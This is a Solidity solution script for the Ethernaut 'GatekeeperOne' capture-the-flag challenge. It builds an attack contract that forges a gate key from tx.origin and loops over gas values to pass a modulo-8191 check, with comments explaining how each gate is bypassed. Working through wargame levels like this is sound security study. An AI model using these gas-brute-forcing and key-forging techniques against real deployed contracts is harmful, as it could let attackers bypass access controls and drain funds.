// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Helper/Broadcasted.s.sol";

contract GatekeeperOneAttack is Broadcasted {
    function attack(address payable gateKeeperOneCtr_) public payable override {
        bytes8 k = bytes8(uint64(uint16(uint160(tx.origin))) + 2 ** 32);
        for (uint256 i = 200; i <= 500; i++) {
            (bool success, ) = address(gateKeeperOneCtr_).call{
                gas: (i + 8191 * 3)
            }(abi.encodeWithSignature(("enter(bytes8)"), k));

            if (success) {
                break;
            }
        }
    }

    function broadcastedAttack(
        address payable gateKeeperOneCtr_
    ) public payable override {
        // intentionally no broadcast to have tx.origin != msg.sender
        attack(gateKeeperOneCtr_);
    }
}

interface IGateKeeperOne {
    //! gate 1 pass making the calls from a contract
    //! gate 2 try to make gasleft() % 8191 == 0 (the number depends on the blockchain
    //!                     etc so there is no specific one and the for boundaries may be changed)
    //!                     a call is being used instead of using methods to avoid reverts when the gas is not correct
    //! gate 3  req1 => the fist 4 bytes and the fist 2 bytes of the key must be equal (the key must be 0x00XX)
    //!         req2 => the fist 4 bytes and the fist 8 bytes of the key must be different (the key must be 0xYY00XX)
    //!         req3 => the key first 2 bytes of the key must be uint16(uint160(tx.origin))
    //!     so the key some value should be added to  uint16(uint160(tx.origin)) to make a key like 0xYY00XX the
    //!               solution provided results in a key like 0x0100XX
    function enter(bytes8 _gateKey) external returns (bool);
}
